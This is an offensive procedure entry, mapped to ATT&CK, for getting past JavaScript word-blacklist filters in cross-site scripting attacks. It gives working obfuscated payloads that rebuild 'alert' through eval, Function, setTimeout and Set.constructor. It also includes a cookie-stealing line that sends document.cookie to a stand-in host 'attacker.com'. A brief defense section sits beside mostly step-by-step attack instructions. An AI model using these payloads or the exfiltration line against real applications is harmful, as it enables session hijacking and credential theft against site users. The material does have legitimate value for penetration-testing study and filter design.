---
id: 3b230502-b8e4-47c9-bb62-3ab28940f8cf
name: Bypass-JavaScript-Word-Blacklist-with-Exotic-Payloads
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.375593+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005]]'
  - '[[tactics/Execution|TA0002]]'
techniques:
  - '[[techniques/Obfuscated-Files-or-Information|T1027]]'
  - '[[techniques/Scripting|T1064]]'
sub_techniques: []
tags:
  - bypass-word-blacklist
  - cross-site-scripting
  - filter-bypass
  - exotic-payloads
  - code-evaluation
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Bypass-JavaScript-Word-Blacklist-with-Exotic-Payloads

## Summary

This procedure demonstrates how to craft exotic JavaScript payloads to bypass word-based blacklists that filter common keywords like 'alert' in vulnerable web applications. By using string concatenation, template literals, constructors, and escape sequences, attackers can execute arbitrary code, such as displaying alerts or performing more malicious actions like credential theft, in contexts where direct script injection is blocked. This is particularly useful in cross-site scripting (XSS) scenarios involving code evaluation sinks like eval() or Function().

## Description

In web applications with input sanitization that blacklists specific words (e.g., 'alert', 'eval'), attackers can evade these filters using obfuscation techniques to reconstruct forbidden strings at runtime. This procedure targets JavaScript execution contexts, such as reflected/stored XSS or server-side code evaluation. The target environment is typically a browser or Node.js runtime where user input is unsafely evaluated. Success allows arbitrary code execution in the application's context, enabling actions like session hijacking, data exfiltration, or page defacement. Prerequisites include identifying a vulnerable input point (e.g., URL parameter, form field) that leads to code evaluation without proper escaping.

## Requirements

1. Access to a vulnerable web application with a code evaluation sink (e.g., eval(userInput) or new Function(userInput)).
2. Knowledge of the blacklist (e.g., via error messages or testing common filters).
3. Tools for testing payloads, such as a browser developer console or proxy like Burp Suite.
4. Basic understanding of JavaScript execution contexts (client-side or server-side).

## Defense

- Implement comprehensive input validation and sanitization using allowlists rather than blacklists for all user inputs.
- Deploy Content Security Policy (CSP) headers to restrict inline scripts, eval(), and Function() usage.
- Use Web Application Firewalls (WAFs) with signature-based detection for obfuscated JavaScript patterns.
- Regularly audit code for unsafe evaluation functions and migrate to safer alternatives like JSON.parse() for data handling.
- Enable logging of script execution attempts and monitor for anomalous browser behaviors.

## Objectives

1. Evade word-based filters to execute forbidden JavaScript functions like alert().
2. Demonstrate proof-of-concept code execution in a filtered environment.
3. Escalate to more advanced payloads for credential theft or data exfiltration.
4. Validate the vulnerability for further exploitation in an attack chain.

## Instructions

### Step 1: Identify the Vulnerable Input and Blacklist

**Context**: Test the input field to confirm it evaluates JavaScript and identify blocked keywords. This step ensures the payload targets the correct filter.

Submit test inputs like `<script>alert(1)</script>` or `eval('alert(1)')` and observe if they are blocked (e.g., via error or no execution). Note any partial blocks, such as 'alert' being stripped.

**Expected Output**: Confirmation of code evaluation (e.g., alert pops if unfiltered) or filter messages indicating blacklisted words.

### Step 2: Craft and Inject Exotic Payloads

**Context**: Use obfuscated variants to bypass the blacklist by avoiding direct use of forbidden strings. Inject into the vulnerable parameter (e.g., ?input=<payload>).

**Code** ([[codes/JavaScript-Exotic-Alert-Payloads-for-Filter-Bypass]]):

Embed one of the following payloads in the input field:

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29`();
```

> These payloads reconstruct 'alert' using concatenation, escapes, and constructors. For example, eval('ale'+'rt(0)') evades filters scanning for full 'alert'. Test each variant until one executes, displaying an alert with the specified number.

**Expected Output**: Alert dialog appears with the payload's argument (e.g., 0, 1), confirming bypass and execution.

### Step 3: Escalate the Payload for Malicious Actions

**Context**: Once basic execution is confirmed, replace alert() with more impactful code, such as fetching external resources or stealing cookies.

Modify a working payload, e.g., replace alert(1) with document.cookie or fetch('http://attacker.com/steal?data='+document.cookie). Re-inject and observe.

**Expected Output**: Network request to attacker server or console log of stolen data, indicating full control.

### Step 4: Verify and Document the Bypass

**Context**: Confirm the payload's reliability across sessions and inputs to ensure it's not a false positive.

Re-test the payload multiple times and note any variations needed for different contexts (e.g., URL encoding for parameters).

**Expected Output**: Consistent execution without filter triggers.
